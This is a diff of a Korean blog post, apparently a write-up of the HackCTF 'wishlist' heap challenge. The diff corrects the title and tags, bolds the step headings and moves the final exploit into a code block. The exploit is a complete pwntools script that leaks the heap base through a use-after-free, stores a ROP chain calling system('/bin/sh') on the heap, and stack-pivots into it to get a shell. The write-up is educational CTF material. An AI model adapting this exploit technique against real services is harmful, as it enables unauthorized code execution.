@@ -1,9 +1,9 @@
 ---
 layout: post
-title:  "HacCTF wishlist write-up"
+title:  "HackCTF wishlist write-up"
 date:   2020-03-26 19:45:55
 image:  hackctf_wishlist.PNG
-tags:   [Hackctf]
+tags:   [HackCTF]
 categories: [Write-up]
 ---
 
@@ -133,27 +133,27 @@ NX비트말곤 딱히 안걸려있다.
 
     다음과 같이 leak이 된다. (위 출력은 코드에서 뒤에 & 연산으로 없앤것)
 
-2. 시나리오4) **1번 메뉴로 "/bin/sh" 문자열 저장함**
+2. **시나리오4) **1번 메뉴로 "/bin/sh" 문자열 저장함****
 
     ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%209.png)
 
     heap_base + 0x10 위치에 들어가는 걸 확인할수 있음
 
-3. 시나리오5)  system 함수는 버퍼를 많이 사용하므로 1번 메뉴로 한 100개정도 malloc 조지기
+3. **시나리오5)  system 함수는 버퍼를 많이 사용하므로 1번 메뉴로 한 100개정도 malloc 조지기**
 
     ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%2010.png)
 
     100번 정도 1번 메뉴를 통해 malloc을 진행하였다
 
-4. 시나리오6) 1번 메뉴로 "pop rdi;ret; 주소" + "/bin/sh주소 " + "system함수"를 힙에 저장
+4. **시나리오6) 1번 메뉴로 "pop rdi;ret; 주소" + "/bin/sh주소 " + "system함수"를 힙에 저장**
 
-    ![]({{ site.baseurl }}/images/write-up/HackCTF/(HackCTF%20wishlist/Untitled%2011.png)
+    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%2011.png)
 
     - 0x400b03 : pop rdi; ret 가젯
     - 0x23cd010 : "/bin/sh" 저장 주소
     - 0x4006c0 : "system 함수 plt"
 
-5. 시나리오7) sub_4008DA() 함수에서 0x20바이트를 다음과 같이 구성해서 ROP 진행
+5. **시나리오7) sub_4008DA() 함수에서 0x20바이트를 다음과 같이 구성해서 ROP 진행**
     - "A"*0x10+ "6번에서 입력한 페이로드 주소"(rbp 위치) +  "leave; ret; 가젯"(ret 위치)
 
     ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%2012.png)
@@ -169,7 +169,7 @@ NX비트말곤 딱히 안걸려있다.
 
     - ret위치에 0x4008d8 를 넣었는데 이는 "leave; ret;" 가젯 주소이다
 
-6. 스택 피보팅으로 fake stack 조지기 !
+6. **스택 피보팅으로 fake stack 조지기 !**
 
     지금부터 중요하다. 위 5번에서 0x20 바이트를 input: 에 입력하고  에필로그 가 진행될때 상황을 살펴보자
 
@@ -203,62 +203,62 @@ NX비트말곤 딱히 안걸려있다.
     - 이제 우리가 아까 힙에 삽입해놨던 ROP 페이로드가 실행되면서 쉘이 떨어진다
 
 최종 익스코드는 다음고 같다
+```python
+from pwn import *
 
-    from pwn import *
-    
-    context(arch="amd64",os="linux",log_level="DEBUG")
-    #p=remote("ctf.j0n9hyun.xyz", 3035)
-    p=process("./wishlist",aslr="False")
-    #gdb.attach(p,'code\nb *0x91f+$code\n')
-    
-    e=ELF("./wishlist")
-    
-    def make(wishlist):
-    	p.sendlineafter("input: ","1")
-    	p.sendafter("wishlist: ",wishlist)
-    
-    def view(index):
-            p.sendlineafter("input: ","2")
-            p.sendlineafter("index: ",str(index))
-    
-    def remove(index):
-            p.sendlineafter("input: ","3")
-            p.sendlineafter("index: ",str(index))
-    
-    make("A"*8)
-    make("B"*8)
+context(arch="amd64",os="linux",log_level="DEBUG")
+#p=remote("ctf.j0n9hyun.xyz", 3035)
+p=process("./wishlist",aslr="False")
+#gdb.attach(p,'code\nb *0x91f+$code\n')
+
+e=ELF("./wishlist")
+
+def make(wishlist):
+    p.sendlineafter("input: ","1")
+    p.sendafter("wishlist: ",wishlist)
+
+def view(index):
+        p.sendlineafter("input: ","2")
+        p.sendlineafter("index: ",str(index))
+
+def remove(index):
+        p.sendlineafter("input: ","3")
+        p.sendlineafter("index: ",str(index))
+
+make("A"*8)
+make("B"*8)
+make("C"*8)
+
+remove(0)
+remove(1)
+
+make("A")
+view(3)
+
+heap_base=u32(p.recv(4)) & 0xFFFFF00
+log.info(hex(heap_base))
+
+make("/bin/sh\x00")
+
+for i in range(0,100):
     make("C"*8)
-    
-    remove(0)
-    remove(1)
-    
-    make("A")
-    view(3)
-    
-    heap_base=u32(p.recv(4)) & 0xFFFFF00
-    log.info(hex(heap_base))
-    
-    make("/bin/sh\x00")
-    
-    for i in range(0,100):
-    	make("C"*8)
-    gdb.attach(p,'code\nb *0x8ca+$code\n')
-    
-    #pause()
-    payload = p64(0x400b03) + p64(heap_base+0x10) + p64(e.plt["system"])
-    #pause()
-    make(payload)
-    #pause()
-    
-    # payload = bheap_base + 0xcf0
-    #gdb.attach(p,'code\nb *0x8ca+$code\n')
-    
-    pause()
-    p.sendlineafter("input: ","1"*0x10+p64(heap_base+0xcf0-8)+p64(0x4008d8))
-    pause()
-    
-    p.interactive()
+gdb.attach(p,'code\nb *0x8ca+$code\n')
 
+#pause()
+payload = p64(0x400b03) + p64(heap_base+0x10) + p64(e.plt["system"])
+#pause()
+make(payload)
+#pause()
+
+# payload = bheap_base + 0xcf0
+#gdb.attach(p,'code\nb *0x8ca+$code\n')
+
+pause()
+p.sendlineafter("input: ","1"*0x10+p64(heap_base+0xcf0-8)+p64(0x4008d8))
+pause()
+
+p.interactive()
+```
 
 
 ### 4. 몰랐던 개념
@@ -270,3 +270,4 @@ NX비트말곤 딱히 안걸려있다.
     [ROP (Return Oriented Programming)](https://dool2ly.tistory.com/72)
 
     [16.Stack pivot](https://www.lazenca.net/display/TEC/16.Stack+pivot)
+    
